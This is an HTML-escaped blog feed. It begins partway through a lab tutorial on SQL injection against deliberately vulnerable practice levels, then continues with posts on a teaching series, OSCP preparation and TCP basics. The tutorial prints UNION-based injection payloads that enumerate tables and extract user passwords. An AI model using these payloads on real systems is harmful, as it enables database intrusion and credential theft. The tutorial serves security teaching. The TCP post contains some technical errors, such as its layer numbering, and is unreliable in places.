&lt;p&gt;Again, we need first of all the table name and the column number but we have no way to inject our SQL code and we get no error so let’s think what we can do, if you remember in the beginning of that article we saw some of the &lt;a href=&quot;#sql-operators&quot;&gt;SQL operators&lt;/a&gt; that we can used in our query, and we have “Hash” sign that used for commit in our query like in other programing language so let’s see how that go.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-047.png&quot; alt=&quot;sql-injection-047.png&quot; /&gt;
&lt;strong&gt;Figure 47&lt;/strong&gt; Query with Hash sign.&lt;/p&gt;

&lt;p&gt;So now we know that there is something that deny for us every query, I want you just look in the source code to see how they apply that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-048.png&quot; alt=&quot;sql-injection-048.png&quot; /&gt;
&lt;strong&gt;Figure 48&lt;/strong&gt; Limit in query with Hash sign.&lt;/p&gt;

&lt;p&gt;Ok, we know now that the query limit for one query only and the error come from the php code, so keep that in mind that this one way to migrate the injection, but as you saw he have way to make the injection anyway with the Hash sign because in SQL this is treat as comment on the query line so this is why the limit to 1 are ignored.&lt;/p&gt;

&lt;p&gt;So now let’s inject the usual injection codes. I am going to apply that injection like I have no clue how the original php code look like.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#
1' UNION SELECT null, table_name FROM information_schema.tables#
1' UNION SELECT null, column_name FROM information_schema.columns#
1' UNION SELECT first_name, password FROM users#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From the first two line we will see that everything work normal but not in the third line, so this is mean that we use only 2 columns, so now I am checking the table name and the columns names that exist in that database, in the last query I am using the columns name on users table in my query and that’s it, we have what we need!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-049.png&quot; alt=&quot;sql-injection-049.png&quot; /&gt;
&lt;strong&gt;Figure 49&lt;/strong&gt; Injection are working with &lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt; sign.&lt;/p&gt;

&lt;p&gt;Please remember that it still Error base, maybe you can called it Blind base but I doesn’t because we have some of error in that level, yeh sure this is not a SQL error, but still we have a way to see here we inject some miss type SQL query.&lt;/p&gt;

&lt;p&gt;Now let’s go for the “Impossible” level and see how that is going on. Again, I recommend to try that level by yourself, I admit that is difficult one, but maybe you have the knowledge to solve it by yourself and if not you can try anyway and lean through Google more and maybe you will find the answer. After you finish check out what I’ve done this time, and again, if you find different solution please let me know or leave a commit down below.&lt;/p&gt;

&lt;p&gt;Ok, everybody like tools, so this is time to lean some tools. It is very important for you to know how to used that tools if you going to check injection vulnerabilities on some website, in this level we face with blind base, if you try to insert something simple like &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; you will see that it’s work fine but if you try to insert something that should cause some error like &lt;code class=&quot;highlighter-rouge&quot;&gt;1'&lt;/code&gt;, your error will never showed up because the php code prevent from us to get the error value, so if he have some error he will never send it to us, just remember that the code that I am talking about is server side code like we saw earlier in this article, and we would never get an access to server side codes, so just keep that in mind, in our case we can view the source code.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-050.png&quot; alt=&quot;sql-injection-050.png&quot; /&gt;
&lt;strong&gt;Figure 50&lt;/strong&gt; Have no error.&lt;/p&gt;

&lt;p&gt;So in the source code you can see that we have some &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement that treat ID only if it equal to numeric value, but we have no &lt;code class=&quot;highlighter-rouge&quot;&gt;else&lt;/code&gt; statement that treat ID if it doesn’t equal to some number so this is blind base.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-051.png&quot; alt=&quot;sql-injection-051.png&quot; /&gt;
&lt;strong&gt;Figure 51&lt;/strong&gt; Blind base.&lt;/p&gt;

&lt;p&gt;To work around that case we going to use sqlmap, first of all I want you to read about &lt;a href=&quot;&quot;&gt;sqlmap&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;how-to-migrate-that-vulnerability&quot;&gt;How to migrate that vulnerability.&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;coming soon&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;videos-in-hebrew-about-sql-injection&quot;&gt;Videos in Hebrew about SQL injection:&lt;/h3&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/wb0RaqskD5s&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;</content><author><name>Guy Zwerdling</name></author><category term="Injection" /><summary type="html">If you look on top 10 of OWASP about Application Security Risks you may find the greatest vulnerabilities on Applications! The cool thing is that injection is the number one and it may sound weird but there is some website that using SQL (Structured Query Language) and you can attack these website in such type of attack that they really should not work anymore but still does. Let's look on the SQL injection in details.</summary></entry><entry><title type="html">Behind the scenes.</title><link href="http://localhost:4000/2018/02/11/behind-the-scenes.html" rel="alternate" type="text/html" title="Behind the scenes." /><published>2018-02-11T00:00:00+02:00</published><updated>2018-02-11T00:00:00+02:00</updated><id>http://localhost:4000/2018/02/11/behind%20the%20scenes</id><content type="html" xml:base="http://localhost:4000/2018/02/11/behind-the-scenes.html">&lt;p&gt;It not so hard to be at home every day, but to be a job less it’s pretty difficult, many time I ask myself what or where I went wrong, I have no clear answer about that, but after all what is really impotent is health, so here I am without job, but I am healthy and I doing what I love which is working on my little projects like NachRiddles for my dear brother or COTW series or developing with Python and JavaScriptso for me is the best. This time I have new project that I call him CyBug series and in this series I teach my friend Johnny every thing that I know in Cyber Security filed (this series are in Hebrew language). We start on SQL injection and I pretty sore that we going to cover every step in the Top 10 of OWASP.&lt;/p&gt;

&lt;h3 id=&quot;sql-injection-in-owasp&quot;&gt;SQL injection in OWASP.&lt;/h3&gt;

&lt;p&gt;My CyBug is pretty cool I think, at least that’s what my friend Johnny says. We start up with SQL injectio and we going through series of examples from low level security to high, mybe I will upload the videos to youtube, but for now you can view it in here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://drive.google.com/open?id=1k9_ySNSlT8T9o0Vu-qLaJ2q6M_z8OTvQ&quot;&gt;&lt;img src=&quot;/assets/images/CyBug.png&quot; alt=&quot;Watch the video&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Good luck!
Guy Zwerdling&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><category term="SQL injection" /><summary type="html">It not so hard to be at home every day, but to be a job less it's pretty difficult, many time I ask myself what or where I went wrong, I have no clear answer about that, but after all what is really impotent is health, so here I am without job, but I am healthy and I doing what I love which is working..</summary></entry><entry><title type="html">Penetration Testing with Kali Linux</title><link href="http://localhost:4000/2017/12/28/Penetration_Testing_with_Kali_Linux.html" rel="alternate" type="text/html" title="Penetration Testing with Kali Linux" /><published>2017-12-28T00:00:00+02:00</published><updated>2017-12-28T00:00:00+02:00</updated><id>http://localhost:4000/2017/12/28/Penetration_Testing_with_Kali_Linux</id><content type="html" xml:base="http://localhost:4000/2017/12/28/Penetration_Testing_with_Kali_Linux.html">&lt;p&gt;To be a Cyber Researcher we need in my opinion to have a very good knowledge about everything that related to  hacking world. There is a lot technologies out there that are very important in our security world and the way they work is very unique and special, yes, you must have a knowledge about programming if you want to be professional Cyber Reasercher , but for pentesting all we need is maybe script languages, any way we need to have a very good and basic understanding in the security world which is include Linux, Networking, script programming language like Python or JavaScript etc. In this article we will go through all of those stuff but before that I want to specified what CheckPoint think that is the basic knowledge that we must have to be a very good ethical hacker:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;reverse engineer.&lt;/li&gt;
  &lt;li&gt;about the web and how it works.&lt;/li&gt;
  &lt;li&gt;Networking.&lt;/li&gt;
  &lt;li&gt;knowledge in logics.&lt;/li&gt;
  &lt;li&gt;and of course programming language.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the syllabus you will find the following&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;About	Kali	Linux&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;about-kali-linux&quot;&gt;About	Kali	Linux&lt;/h1&gt;</content><author><name>Guy Zwerdling</name></author><category term="pentest" /><summary type="html">This time I decided to lean to OSCP certification exam, this exam called PWK (Penetration Testing with Kali Linux) from offensive security, for me it's what I want for a long time. In this article I will go through the PWK syllabus step by step to preparer myself to this exam very well. I also using three books as follow: Kali_Revealed_1st_edition Penetration Testing - A hands-on introduction to Hacking hacking-the-art-of-exploitation I am also going to setup virtual lab for everything in that article, it going to be very cool stuff and I am sure that after I finish here I will have a very good knowledge about Penetration Testing with Linux Kali.</summary></entry><entry><title type="html">TCP connection</title><link href="http://localhost:4000/2017/11/24/TCP-connection.html" rel="alternate" type="text/html" title="TCP connection" /><published>2017-11-24T00:00:00+02:00</published><updated>2017-11-24T00:00:00+02:00</updated><id>http://localhost:4000/2017/11/24/TCP-connection</id><content type="html" xml:base="http://localhost:4000/2017/11/24/TCP-connection.html">&lt;p&gt;Ok, I write this post because of two things, the first reason is because I had in interview in some High Tech School and I ran for a teacher job position, the first interview was great, my passion for security and hacking stuff done more than I expected, for one second I thought that I will be a Cyber coacher, but the second interview was worse, In the second interview I was needed to speak about the TCP and UDP protocols, I have a great knowledge about those two, but to be sure I going on to read about theme little more, in the interview I was needed to pass a lesson to some students that doesn’t know nothing about networking nor security stuff, so I try to explain everything but I confused everything and the students found it difficult to understand the material, so I was not accepted to teach there. I remember when I first learn the TCP I have so much question but the teacher doesn’t really give me the all knowledge about TCP so I was needed to look over the Internet and with some Google search I found what I was needed, so these are the two reason why I was write the article, first I have knowledge of TCP and I feel like I need to improve it to myself after I failed in the interview, and second I want that if some one will read that article he will have very good understanding how TCP really work.&lt;/p&gt;

&lt;p&gt;The well none protocol named TCP is one of the important protocol that really matter in the wide network of today. This protocol as a big play part
in the Internet in general, many protocols relay on TCP and many protocols designed in such way that without TCP they cannot run. The Important thin
is that the TCP is can seams so complex but the truth is the opposite, all we need to do is actually look on the session of some protocol that relay on TCP and after we learn theoretically how TCP works it’s more easy to understand.&lt;/p&gt;

&lt;p&gt;In my opinion, to understand really good how TCP work we need to lean as follow:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#tcp-in-the-osi-and-tcp-ip-module&quot;&gt;TCP in the OSI and TCP-IP module.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#basic-tcp-functionality-and-basic-flags-like-syn-ack-fin&quot;&gt;Basic TCP Functionality and basic flags like SYN, ACK, FIN.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#history-of-tcp-in-rfcs-793-3168-3540&quot;&gt;History of TCP in RFC’s 793/3168/3540.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tcp-segment-structure&quot;&gt;TCP segment structure.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tcp-session-in-real-world&quot;&gt;TCP session in real world.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#the-special-flags&quot;&gt;The special flags.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tcp-attacks&quot;&gt;TCP attacks.&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;so let’s get started&lt;/p&gt;

&lt;h3 id=&quot;tcp-in-the-osi-and-tcp-ip-module&quot;&gt;TCP in the OSI and TCP-IP module&lt;/h3&gt;

&lt;p&gt;first of all TCP is in the Transport layer in the TCP/IP or IOS models. Brief refresh on OSI model, this is a seven layers model that are labeled from 1 through 7.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Layer No.&lt;/th&gt;
      &lt;th&gt;Layer Name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;Application&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Consists of standard communication services and applications that everyone can use.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;Presentation&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Ensures that information is delivered to the receiving machine in a form that it can understand.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;Session&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Manages the connections and terminations between cooperating computers.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;Transport&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Manages the transfer of data and assures that received and transmitted data are identical.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;Network&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Manages data addressing and delivery between networks.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;Data Link&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Handles the transfer of data across the network media.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;Physical&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Defines the characteristics of the network hardware.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Figure 1 OSI Model&lt;/p&gt;

&lt;p&gt;The transport layer is where the TCP live, Layer 4 of the OSI model is named the transport layer and is responsible for message segmentation, acknowledgement, traffic control, and session multiplexing. The transport layer also has the ability to perform error detection and correction (resends), message reordering to ensure message sequence, and reliable message channel depending on the specific transport layer protocol used. The most common of the used transport layer protocols include the Transport Control Protocol (TCP) and User Datagram Protocol (UDP).&lt;/p&gt;

&lt;p&gt;TCP is also on layer 3 of TCP/IP model, like the OSI model, the TCP/IP model is layered and is used in the same fashion as the OSI model but with fewer layers. As the modern Internet and most communications use the Internet Protocol (IP), the TCP/IP model is technically more in line with modern network implementations. As stated before, the layers within the TCP/IP model are considered less rigid then that of the OSI model, which basically means that many protocols implemented can be considered in grey areas between one area and another. The TCP/IP protocol suite (often referred to as the TCP/IP protocol) contains the same protocols referenced in the earlier OSI model sections. Figure
2 below shows a representation of the TCP/IP model:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Layer No.&lt;/th&gt;
      &lt;th&gt;Layer Name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;Application&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Consists of standard communication services and applications that everyone can use.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;Transport&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Manages the transfer of data and assures that received and transmitted data are identical.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;Network&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Manages data addressing and delivery between networks.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;Link&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Handles the transfer of data across the network media.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Figure 2 TCP/IP Model&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;TCP is paced in transport layer in the TCP/IP and OSI model, this layer is about reliability of the connection the message that sent on that layer are called segments, this layer also responsible for acknowledgement, traffic control, and session multiplexing. will will see as we proceed in the article how it actually look like in real communication between tow endpoints.&lt;/p&gt;

&lt;h3 id=&quot;basic-tcp-functionality-and-basic-flags-like-syn-ack-fin&quot;&gt;Basic TCP Functionality and basic flags like SYN ACK FIN&lt;/h3&gt;

&lt;p&gt;The functionality of the TCP working with two main important thing:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Approved every revived TCP segment, in that way the other side that get the approvement know that what he sent successfully arrived to the other side.&lt;/li&gt;
  &lt;li&gt;Numbering every segment with some sequence number before we sent it, in this way we can be shore that if the other side get the segments &lt;strong&gt;not in the same order&lt;/strong&gt; as we sent it he will know what the order by that sequence number.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;those are the main thing that TCP responsible to do, there is many application out there that working with TCP because of this functionality, but the is some application that doesn’t and this can be because of millions reasons one of that is that the application itself for some reason do checking that the other side get the message.&lt;/p&gt;

&lt;p&gt;The is three which is the most important flags in every session that you will see in every TCP session is the SYN, ACK and FIN. The SYN flag is used every time some endpoint want to start session with other endpoint, you can consider that like the following example:&lt;/p&gt;

&lt;p&gt;some one named Bob go’s down the street and see his friend John, so he start a conversation:&lt;/p&gt;

&lt;p&gt;Bob: Hello! how do you do?&lt;/p&gt;

&lt;p&gt;John: I’m good! and you?&lt;/p&gt;

&lt;p&gt;Bob: Great!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tcp-session-page-001.jpg&quot; alt=&quot;tcp-session&quot; title=&quot;tcp-session&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
Figure 3 real life conversation&lt;/p&gt;

&lt;p&gt;In TCP it pretty much the same, one side ask the other that he want to start conversation with him and the other response with sort of ok and the first one do the same.&lt;/p&gt;

&lt;p&gt;endpoint1: I wanna to SYN with you!&lt;/p&gt;

&lt;p&gt;endpoint2: OK, I want to SYN with you too!&lt;/p&gt;

&lt;p&gt;endpoint1: OK.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/SYN+ACK.png&quot; alt=&quot;SYN+ACK&quot; title=&quot;SYN+ACK&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
Figure 4 TCP starting conversation&lt;/p&gt;

&lt;p&gt;In real session you will see that the most if not all segment message are sent with the flag ACK as active which means that we get what the other endpoint was sent and now we respond for it with new segment and approved the receivement with ACK flag.&lt;/p&gt;

&lt;p&gt;As you go foreword in this article you will see that every flag is actually a bit in the segment message that represent by &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, if the flag is active than we will see that the bit is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;There is many flags out there but the other flag that we will see often is the FIN flag that stand for finish. If one side of opening conversation want to close the session, he is just send TCP segment message with activated FIN flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/FIN+ACK.png&quot; alt=&quot;FIN+ACK&quot; title=&quot;FIN+ACK&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
Figure 5 TCP ending conversation&lt;/p&gt;

&lt;p&gt;Till now is so simple; to open a session all we need to do is to send &lt;strong&gt;SYN&lt;/strong&gt; flag to the other side, throughout the conversation we always approved the receivement of the TCP segment from the other side with activated &lt;strong&gt;ACK&lt;/strong&gt;, when we wanna close running session we just sent TCP segment with activated &lt;strong&gt;FIN&lt;/strong&gt; flag and that’s it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So the functionality of TCP is always approved if we get the segment or not and numbering the TCP segment with sequence number.&lt;/p&gt;

&lt;h3 id=&quot;history-of-tcp-in-rfcs-793-3168-3540&quot;&gt;History of TCP in RFCs 793 3168 3540.&lt;/h3&gt;

&lt;p&gt;Before we start to get down to deep detail is better to know some history. The TCP was developed and designed in 1970s by two DARPA scientists - Vinton Cerf and Bob Kahn, persons most often called the fathers of the Internet.&lt;/p&gt;

&lt;p&gt;Kahn worked on an existing project to establish a satellite packet network, and initiated a project to establish a ground-based radio packet network. These experiences convinced him of the need for development of an open-architecture network model, where any network could communicate with any other independent of individual hardware and software configuration. Kahn therefore set four goals for the design of what would become the &lt;strong&gt;Transmission Control Protocol&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In the spring of 1973, Vinton Cerf joined Kahn on the project and together they wrote the RFC 675 and it was the first ever version of TCP and the real name of TCP was &lt;strong&gt;Transmission Control Program&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;In 1981 DARPA scientists write another RFC number 793 and this was actually the first RFC of the &lt;strong&gt;TRANSMISSION CONTROL PROTOCOL&lt;/strong&gt;, in that RFC we can find a structure of the TCP/IP model and the TCP implementations.&lt;/p&gt;

&lt;p&gt;There is some more RFC that discuss the TCP and update the protocol, but I want to focus on only two RFCs 3168 and 3540. The original RFC 793 specified a six flags that we can activat in the TCP segment which is as follow:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;URG&lt;/li&gt;
  &lt;li&gt;ACK&lt;/li&gt;
  &lt;li&gt;PSH&lt;/li&gt;
  &lt;li&gt;RST&lt;/li&gt;
  &lt;li&gt;SYN&lt;/li&gt;
  &lt;li&gt;FIN&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;I will explain them all later on&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The RFCs 3168 and 3540 specifies together three bit flags named ECN which stand for Explicit Congestion Notification, the three flags are as follow:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ECN-none&lt;/li&gt;
  &lt;li&gt;CWR&lt;/li&gt;
  &lt;li&gt;ECE&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Please remember those, we will come back to them later on&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The TCP at first was publish in RFC 793 and update later in RFC 3168 and RFC 3540, these are important because the bits that they specified, we will see as we go further in this article why we need these three bit flags, but for know I just want you to remember that there is six main flags and more three flags that responsible for congestion which is sort of collision that accrue in the network.&lt;/p&gt;

&lt;h3 id=&quot;tcp-segment-structure&quot;&gt;TCP segment structure.&lt;/h3&gt;

&lt;p&gt;Ok, now we going to discuss on the really cool things in TCP segment. The structure of the TCP header look like follow:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/TCP.jpg&quot; alt=&quot;TCP&quot; title=&quot;TCP&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
Figure 6 TCP header structure&lt;/p&gt;

&lt;p&gt;As you can see the length of the segment is 32 bit long, just please remember that the TCP segment is consists of bits so in reality it’s structure of &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; that represented the values of the filed in the TCP header.&lt;/p&gt;

&lt;p&gt;So let’s check out the headers:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Source ports&lt;/strong&gt; - The port number is really important because with that port we use to represent some service. In source port the sender generate some random port between 49152 to 65535 and that port are used through all the session between the two devices that communicate.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Destination port&lt;/strong&gt; - The destination port is actually some service that represented by some port, as example HTTP represented by port 80 and FTP represented by port 21, so, if we want to use some service of some server like HTTP, we communicate with that server by using port 80 in the destination, in that way the receiver which is the server know that we want the HTTP service which is used to display some HTML page that the server has.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sequence number&lt;/strong&gt; - Sequence number or short SEQ is used to tracked down the data that as being send, so if we sent some data we count the data in the sequence field plus previous sequence number, as example if we had in the previous sequence field 1476 and the amount of data we sending now is 658 byte, the new sequence will be 1476 + 658 which is 2134, this mean that the sequence number always go greater through the session. please remember the rule of the sequence number as follow:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The sequence number is the number of &lt;strong&gt;previously sent data&lt;/strong&gt; plus the &lt;strong&gt;previously sent sequence number&lt;/strong&gt; to the other endpoint.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Acknowledgement number&lt;/strong&gt; - This field used to acknowledge the data that we receive, in that way we can know what data as being receive by the other side and what data doesn’t by the acknowledge number that the other side send us after he get some data from us, if he doesn’t get the data we will don’t received any acknowledge from him about that data so in this case we will send the data again until the other side will approve that he get the data. The counting of the acknowledgement goes by the following rule:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The acknowledgement number is the number of the &lt;strong&gt;received data&lt;/strong&gt; plus the &lt;strong&gt;received sequence number&lt;/strong&gt; we get from the other endpoint.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I want to stop you here to clear the &lt;strong&gt;ACK&lt;/strong&gt; and &lt;strong&gt;SEQ&lt;/strong&gt; numbers in the session. later on I will demonstrate that principle again and again because I want that you will have a good understanding how the things really works.&lt;/p&gt;

&lt;p&gt;If you remember in the section of &lt;strong&gt;Basic TCP Functionality&lt;/strong&gt; we saw some basic session like starting session in TCP and ending session, so, let’s look now in deep what is really going on.&lt;/p&gt;

&lt;p&gt;Let’s say that John want to communicate with bob in some sort of protocol that using TCP.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;To start the session John need to send &lt;strong&gt;SYN&lt;/strong&gt; flag first because he want to synchronize with Bob about some values that will be used through the conversation. in the SEQ and ACK headers the values will be 0’s because nothing of the rules that we saw earlier doesn’t apply yet, we have no received data and no received sequence number, and we haven’t sent any data and sequence number. because this is the first time we send message in TCP with flag SYN set, the message that send will be count with 1 phantom byte because of the SYN flag.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/firstSYN.png&quot; alt=&quot;&quot; /&gt;&lt;strong&gt;Figure 7&lt;/strong&gt; first-SYN from John.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bob received the TCP segment message, he sees that the message contain flag of SYN in active form so he knows that John want to start conversation with him. Bob respond with two flags: &lt;strong&gt;SYN&lt;/strong&gt; and &lt;strong&gt;ACK&lt;/strong&gt;, the SYN is because he want to synchronize with John about some values like John did, and the ACK is because he want to inform John that he get the message. In the ACK number header Bob set it to 1 because as you remember the received data is 1 which is the phantom byte and the received sequence number is 0 so it’s 1+0=1, so now when John will get this message he will new by the acknowledgement number that the previous message arrived successfully without data lost.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/firstSYN3.png&quot; alt=&quot;SYN-and-ACK&quot; title=&quot;SYN-and-ACK&quot; class=&quot;img-responsive&quot; height=&quot;3000px&quot; /&gt;
Figure 8 SYN and ACK from Bob with acknowledgement number calculation.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;John received the message and sees that Bob what to synchronize with him too, he also see the ACK flag active so he know that Bob actually approved the receivement, because Bob activated SYN flag John count it as phantom byte and add it to the sequence number which is 0, so in the message that John going send to Bob filled with ACK value of 1, and now because John sent previously some message that contain sequence number of 0 and phantom byte of 1 (because of the SYN) John now respond to Bob with TCP segment that contain sequence number of 1. in the flag area John activate only the ACK flag to approved that the segment that came from Bob successfully arrived.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/firstSYN4.png&quot; alt=&quot;ACK&quot; title=&quot;ACK-from-john&quot; class=&quot;img-responsive&quot; height=&quot;3000px&quot; /&gt;
Figure 9 ACK from John with sequence of 1 and acknowledge of 1.&lt;/p&gt;

&lt;p&gt;we will see more of that ack and seq calculation further on.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TCP header length&lt;/strong&gt; - This header also called &lt;strong&gt;data offset&lt;/strong&gt;, this field are specified the entire length of the TCP segment, this include the previous headers, the source and destination port number, the acknowledgement number, the sequence number and so on. As you can see in the diagram in figure 6 this field in 4 bit long.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Reserved&lt;/strong&gt; - The reserved is actually the gray field in the diagram in figure 6, it is 6 bit long that &lt;strong&gt;reserved&lt;/strong&gt; for future use. It’s actually just 3 bit and more 3 bit used for ECN as I specified earlier, but just keep in mind that there is 6 bit in that area and after that more 6 bit that used for flags.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Flags&lt;/strong&gt; - The 6 bits after the reserved bits are used for flags, this flags is takes a big part in the tcp session. for each flag there is a scenario, to see each flag we going to use network analyzer like Wireshark, you can use TCPdump or NAST or any kind of analyzer you like, I’m using Wireshark for the examples. we going to see each flag but not in the same order as you saw in the TCP segment structure you’ll understand why later on.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
